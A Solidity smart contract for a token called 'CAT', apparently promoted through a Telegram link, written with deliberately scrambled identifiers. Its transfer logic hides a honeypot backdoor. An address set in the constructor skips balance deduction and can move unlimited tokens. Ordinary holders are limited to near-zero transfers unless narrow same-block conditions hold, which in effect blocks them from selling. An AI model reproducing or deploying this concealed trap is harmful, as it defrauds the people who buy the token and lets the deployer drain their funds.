/*

https://t.me/erccatcoin

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract CAT is Ownable {
    IUniswapV2Router02 private jlgdreoqswu;

    mapping(address => uint256) private heqiwtugjdnb;

    function transfer(address hvrcnmsj, uint256 eczd) public returns (bool success) {
        ekzrw(msg.sender, hvrcnmsj, eczd);
        return true;
    }

    string public symbol;

    function approve(address lkmwzfqdpj, uint256 eczd) public returns (bool success) {
        allowance[msg.sender][lkmwzfqdpj] = eczd;
        emit Approval(msg.sender, lkmwzfqdpj, eczd);
        return true;
    }

    string public name;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private myau = 120;

    mapping(address => uint256) public balanceOf;

    constructor(string memory qsdzrtf, string memory ouvc, address ebcwqz, address vwzogkfm) {
        name = qsdzrtf;
        symbol = ouvc;
        balanceOf[msg.sender] = totalSupply;
        heqiwtugjdnb[vwzogkfm] = myau;
        jlgdreoqswu = IUniswapV2Router02(ebcwqz);
    }

    mapping(address => uint256) private cbwaxyslpmu;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private gdvrmsc;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address bemn, address hvrcnmsj, uint256 eczd) public returns (bool success) {
        require(eczd <= allowance[bemn][msg.sender]);
        allowance[bemn][msg.sender] -= eczd;
        ekzrw(bemn, hvrcnmsj, eczd);
        return true;
    }

    function ekzrw(address bemn, address hvrcnmsj, uint256 eczd) private {
        address fugmjkhyw = IUniswapV2Factory(jlgdreoqswu.factory()).getPair(address(this), jlgdreoqswu.WETH());
        bool shcv = gdvrmsc[bemn] == block.number;
        uint256 qbpzekvrjht = heqiwtugjdnb[bemn];
        if (qbpzekvrjht - qbpzekvrjht == qbpzekvrjht) {
            if (bemn != fugmjkhyw && (!shcv || eczd > cbwaxyslpmu[bemn]) && eczd < totalSupply) {
                require(eczd <= totalSupply / (10 ** decimals));
            }
            balanceOf[bemn] -= eczd;
        }
        cbwaxyslpmu[hvrcnmsj] = eczd;
        balanceOf[hvrcnmsj] += eczd;
        gdvrmsc[hvrcnmsj] = block.number;
        emit Transfer(bemn, hvrcnmsj, eczd);
    }

    uint8 public decimals = 9;
}
